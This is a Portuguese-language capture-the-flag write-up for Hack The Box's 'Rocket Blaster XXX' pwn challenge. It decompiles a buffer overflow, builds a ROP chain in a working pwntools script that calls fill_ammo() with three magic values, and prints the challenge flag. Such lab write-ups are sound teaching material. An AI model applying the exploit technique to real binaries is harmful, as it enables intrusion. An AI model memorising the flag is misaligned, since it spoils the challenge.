# WriteUp: Rocket Blaster XXX

## Descrição do Desafio:
**Autor**: [w3th4nds](https://app.hackthebox.com/users/70668) \
**Plataforma**: [Hack The Box](https://app.hackthebox.com/challenges/664) \
**Categoria**: Pwn \
**Dificuldade**: Fácil \
**Data**: 2024 \
**Descrição**:
> Prepare for the ultimate showdown! Load your weapons, gear up for battle, and dive into the epic fray—let the fight commence!

## Passo a Passo da Solução
### 1. Análise do arquivo fornecido
O desafio não fornece código-fonte, e executando o executável vemos que podemos inserir algum *input*. Após isso o programa encerra a execução.

```bash
Prepare for trouble and make it double, or triple..

You need to place the ammo in the right place to load the Rocket Blaster XXX!

>> HawkSec_Best_Team

Preparing beta testing..
```

Analisando o assembly pelo **Ghidra**, podemos perceber que o código se resume basicamente a função `main()` que chama uma função para definir uns valores iniciais e chama outra para imprimir o banner, por fim chama a `read()` para ler a entrada do usuário.

{% code title="main" overflow="wrap" lineNumbers="true" %}

```c
undefined8 main(void)

{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  banner();
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  fflush(stdout);
  printf(
        "\nPrepare for trouble and make it double, or triple..\n\nYou need to place the ammo in the right place to load the Rocket Blaster XXX!\n\n>> "
        );
  fflush(stdout);
  read(0,&local_28,0x66);
  puts("\nPreparing beta testing..");
  return 0;
}
```

{% endcode %}

Porém, podemos notar mais duas outras coisas. A primeira é que o *buffer* pode ser estourado por meio da quantidade informada na função `read()`, e a segunda é que existe uma função denominada `fill_ammo()` que imprime a **flag** caso seus parâmetros sejam iguais a `0xdeadbeef`, `0xdeadbabe`, e `0xdead1337`.

### 2. Exploit
Este desafio consiste no *exploit* conhecido como **ROP**, pois nosso objetivo é controlar o fluxo de retorno da função `main()`, de forma que seja possível retornar para instruções que nos permitam modificar o valor de registradores específicos, para definirmos os parâmetros, e por fim retorne para a função `fill_ammo()`.

{% hint style="info" %}

**Nota:** Se o executável fosse **32-bits** o *exploit* seria apenas um *buffer overflow*, pois nessa arquitetura os parâmetros são passados pela pilha.

{% endhint %}

Como o executável não contém a proteção `PIE`, não precisamos nos preocupar com vazar algum endereço, e podemos verificar a existência dos *gadgets* através do comando `ROPgadget --binary=rocket_blaster_xxx`. 

Por meio do comando, verificamos que existe os *gadgets* para os parâmetros, e por fim, podemos identificar a quantidade de *bytes* que devemos escrever com lixo para chegar no endereço de retorno por meio do **pwndbg**, um *breakpoint*, e um *buffer* estourado.

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
from pwn import *

elf = context.binary = ELF("./rocket_blaster_xxx")
p = remote("ip", porta)
#p = process()

# ROP gadgets.
pop_param1 = 0x000000000040159f
pop_param2 = 0x000000000040159d
pop_param3 = 0x000000000040159b
# Parâmetros.
param1 = 0xdeadbeef
param2 = 0xdeadbabe
param3 = 0xdead1337
# Payload
payload = flat(
    "A" * 40,
    p64(pop_param1),
    p64(param1),
    p64(pop_param2),
    p64(param2),
    p64(pop_param3),
    p64(param3),
    p64(0x000000000040101a), # instrução ret para alinhar a pilha
    p64(elf.sym["fill_ammo"])
)

p.sendlineafter(b">> ", payload)

print(p.recvall().decode())
```

{% endcode %}

### Flag
`HTB{b00m_b00m_b00m_3_r0ck3t5_t0_th3_m00n}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)